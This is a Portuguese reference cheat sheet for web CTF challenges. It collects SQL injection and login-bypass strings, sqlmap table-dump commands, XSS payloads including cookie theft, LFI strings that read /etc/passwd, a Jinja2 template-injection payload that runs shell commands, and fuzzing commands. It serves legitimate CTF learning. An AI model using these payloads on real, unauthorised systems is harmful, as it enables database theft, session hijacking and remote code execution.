# 🌐 Guia de referência de web para CTF

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Web-CTF.tr.md) • [🇬🇷 Ελληνικά](Web-CTF.el.md)

> **Termos e precisão:** SQLi é injeção SQL; XSS executa script no contexto de uma página; LFI é inclusão de ficheiros locais; SSTI é injeção em templates processados no servidor; RCE é execução remota de código. Os payloads dependem do motor e do contexto: os exemplos LFI com byte nulo são históricos, e o exemplo Jinja2 não é universal. Um JWT assinado em formato compacto tem segmentos Base64URL separados por pontos; descodificar o token inteiro com Base64 comum, como sugere o exemplo abreviado `eyJ...`, não é um descodificador JWT completo. Ler os dados não valida a assinatura nem equivale a decifrar um token cifrado ([RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html)). Os comandos e payloads foram mantidos sem alterações.

---

## 💉 Injeção SQL

### Payloads básicos
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

## 📜 XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI (Local File Inclusion)

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI (Server-Side Template Injection)

### Deteção
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Jinja2 RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 Contorno da autenticação

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

## 🍪 Cookie/JWT

```bash
# Descodificar o JWT
echo "eyJ..." | base64 -d

# Ferramentas
jwt_tool.py token
jwt.io (online)
```

---

## 🛠️ Ferramentas úteis

```bash
# Pesquisa de diretórios por força bruta
gobuster dir -u http://url -w wordlist.txt

# Fuzzing
ffuf -u http://url/FUZZ -w wordlist.txt

# Descoberta de parâmetros
arjun -u http://url
```

---

## 📋 Lista de verificação de web para CTF

```markdown
□ Verificar o código-fonte (Ctrl+U)
□ Verificar robots.txt e sitemap.xml
□ Verificar cookies/JWT
□ Testar SQLi nos campos de entrada
□ Testar XSS nos campos de entrada
□ Testar LFI nos parâmetros de ficheiros
□ Verificar a presença de SSTI
□ Pesquisa de diretórios por força bruta
□ Verificar se existe um diretório .git exposto
```

---

**Voltar a CTF:** [🏁 Visão geral de CTF](README.pt.md)
